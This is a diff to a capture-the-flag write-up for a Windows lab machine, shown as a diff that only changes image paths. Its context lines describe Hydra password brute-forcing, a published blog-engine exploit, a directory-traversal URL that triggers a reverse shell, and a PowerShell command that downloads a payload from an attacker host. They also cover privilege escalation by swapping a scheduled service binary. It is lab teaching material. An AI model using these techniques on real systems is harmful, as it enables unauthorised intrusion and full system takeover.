@@ -40,11 +40,11 @@ There are just two ports open:
 
 Looks like a windows machine with a web server and somewhere to logon. Checking the landing page shows a blog with the main picture of pennywise the clown.
 
-![](../assets/img/2026-01-26-HackPark/1.png)
+![](/assets/img/2026-01-26-HackPark/1.png)
 
 I run a few gobuster scans in the background to find subdirectories/subdomains to save on time and dig deeper on the page. I get a hit back on /admin which redirects to a login panel.
 
-![](../assets/img/2026-01-26-HackPark/2.png)
+![](/assets/img/2026-01-26-HackPark/2.png)
 
 I'm going to use Hydra to brute force passwords for pennywise, admin, root, and visitor1 (someone who commented). 
 
@@ -54,18 +54,18 @@ hydra -l admin -P /opt/SecLists/rockyou.txt 10.64.152.140 http-post-form "/Accou
 
 I get a valid password for admin we can use to sign in with.
 
-![](../assets/img/2026-01-26-HackPark/3.png)
+![](/assets/img/2026-01-26-HackPark/3.png)
 
 ## Initial Foothold
 My first thoughts were to change a template page's source code to be a reverse shell and navigate to it, but the themes seemed premade and didn't allow for raw code to be replaced. A bit more looking around disclosed the site's engine and version.
 
-![](../assets/img/2026-01-26-HackPark/4.png)
+![](/assets/img/2026-01-26-HackPark/4.png)
 
 I find an RCE/Directory traversal exploit for this application which will allow us to grab a reverse shell. This exploit exists due a local file inclusion vulnerability in PostList.ascx.cs that allows attackers to use the PostView.ascx component to upload files using the file manager utility. [Here](https://www.exploit-db.com/exploits/46353) is a link to the one I used.
 
 First we download the raw exploit using wget and change the IP/Port to point towards our attacking machine. Next, up we change the filename to PostView.ascx and navigate to a post on the site's content page. When editing the post, in the top right is a file manager icon we can use to upload our malicious script at.
 
-![](../assets/img/2026-01-26-HackPark/5.png)
+![](/assets/img/2026-01-26-HackPark/5.png)
 
 Finally, setup our Netcat listener and use the following URL to traverse directories into where our script is at to proc the reverse shell.
 
@@ -73,7 +73,7 @@ Finally, setup our Netcat listener and use the following URL to traverse directo
 http://MACHINE_IP/?theme=../../App_Data/files
 ```
 
-![](../assets/img/2026-01-26-HackPark/6.png)
+![](/assets/img/2026-01-26-HackPark/6.png)
 
 We're currently running as the web server with a crappy shell, so let's upgrade it with an msfvenom payload.
 
@@ -89,24 +89,24 @@ powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:PORT/shelly.exe' -Outf
 
 Then setup a meterpreter handler using Metaspoit and manually execute it on the remote machine to get an upgraded shell. Make sure to set the handler's payload to the one used in the msfvenom command to ensure a valid connection.
 
-![](../assets/img/2026-01-26-HackPark/7.png)
+![](/assets/img/2026-01-26-HackPark/7.png)
 
 ## Privilege Escalation
 Now we can start looking at ways to escalate privileges other administrator. We can display the OS version using sysinfo in our meterpreter shell and use that to find any exploits using [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) or upload [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) like I did.
 
 Doing so will result in us finding a vulnerable .exe file under `C:\Program Files (x86)`. The Events folder under SystemScheduler has a log file which displays that the Administrator is stopping and starting the service, meaning it will run as their account as well.
 
-![](../assets/img/2026-01-26-HackPark/8.png)
+![](/assets/img/2026-01-26-HackPark/8.png)
 
 This log file shows that the `Message.exe` is being ran by admin and we also have the ability to replace that .exe name with our own shell by moving the preexisting one to a backup file and shoving ours in its place.
 
 I'll upload the same shell from earlier as it's already compiled using the Powershell `Invoke-WebRequest` method again.
 
-![](../assets/img/2026-01-26-HackPark/9.png)
+![](/assets/img/2026-01-26-HackPark/9.png)
 
 Now we can setup another Metasploit handler and wait for the background process to run it as administrator to get full access over the system.
 
-![](../assets/img/2026-01-26-HackPark/10.png)
+![](/assets/img/2026-01-26-HackPark/10.png)
 
 Finally grabbing both the user flag under the `C:\Users\Jeff\Desktop` folder and the root flag under the respective Admin one completes the box. This was a fun and simple one, I liked enumerating the machine to find which binary was subject to be exploited.
 
